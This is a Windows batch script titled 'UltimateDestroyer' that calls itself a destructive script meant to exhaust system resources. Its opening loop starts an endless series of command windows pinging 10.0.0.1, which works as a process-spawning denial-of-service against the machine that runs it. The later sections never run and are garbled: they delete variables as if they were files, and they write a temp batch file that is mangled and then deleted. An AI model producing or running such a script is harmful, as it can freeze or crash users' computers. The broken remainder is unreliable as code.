@echo off
title UltimateDestroyer
echo Running the Ultimate Destructive Script. Please be cautious.

:: Infinite loop for CPU-intensive loop using a busy sleep
:loop
start cmd /c ping 10.0.0.1 -n 1 -w 1 >nul
goto loop

:: Open another resource-intensive command prompt
start cmd /c ""%~dpnx0" _the_pain"

:: Consume resources forever
:consume_cpu
setlocal EnableDelayedExpansion

:: Recursively loop 10000 times creating and destroying empty variables
for /L %%A in (1,1,10000) do (
  set "temp_var_!temp_counter!=!"
  if defined temp_var_%%A (
    del temp_var_%%A >nul 2>&1
    set /a temp_counter+=1
  )
)

call :consume_cpu

:: The _the_pain code in case it's not in the same directory
if not defined _the_pain_added (
  set _the_pain_added=1
  echo @echo off >> "%temp%\the_pain.bat"
  echo title PingForever >> "%temp%\the_pain.bat"
  echo Setlocal >> "%temp%\the_pain.bat"
  echo :: Infinite loop for heavy resource usage >> "%temp%\the_pain.bat"
  echo :ping >> "%temp%\the_pain.bat"
  echo for /L %%a in (1,1,10000) do ( >> "%temp%\the_pain.bat"
  echo    ping 10.0.0.1 -n 1 -w 1 >nul ^&^& timeout /t 1 /nobreak ^&^& echo ) >> "%temp%\the_pain.bat"
  echo    goto :ping >> "%temp%\the_pain.bat"
  start /min cmd /c "%temp%\the_pain.bat"
  del "%temp%\the_pain.bat"
)